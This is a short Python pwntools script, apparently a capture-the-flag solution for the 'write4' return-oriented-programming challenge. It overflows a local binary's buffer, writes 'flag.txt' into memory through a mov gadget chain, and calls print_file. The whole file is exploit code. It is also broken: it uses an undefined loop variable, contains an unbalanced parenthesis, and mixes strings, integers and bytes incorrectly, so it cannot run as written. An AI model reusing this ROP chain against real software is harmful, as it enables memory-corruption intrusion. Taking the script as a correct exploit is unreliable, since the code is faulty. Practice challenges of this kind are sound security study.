from pwn import *


data_addr = 0x00601028
mov_gadget = 0x00400628
pop = 0x0000000000400690
pop_ret = 0x0000000000400693
pop_rdi = 0x0000000000400693

# target
flag = "flag.txt"

def mem_ropchain(pop, data_addr, target, mov):
    string_length = len(target)
    align = string_length % 8
    ropchain = ''

    # pad stringi if not 8-byte aligned
    if align != 0:
        target += (8 - align) * "\x00"
        string_length = len(target)

    for _ in range(0, string_length, 8):
        ropchain += p64(str(pop))
        ropchain += p64(data_addr + _)
        ropchain += target[i:i+8]
        ropchain += p64((str(mov))
    return ropchain


def write_primitive():
    print_file = p64(0x00400510)     # address of print_file
    
    ropchain = 'A' * 40
    ropchain +=  mem_ropchain(pop, data_addr, flag, mov_gadget)
    ropchain += pop_rdi + p64(flag)
    ropchain += print_file

    p = process(["./write4"])
    p.recvuntil("> ")
    p.send(ropchain)



if __name__ == "__main__":
    write_primitive()
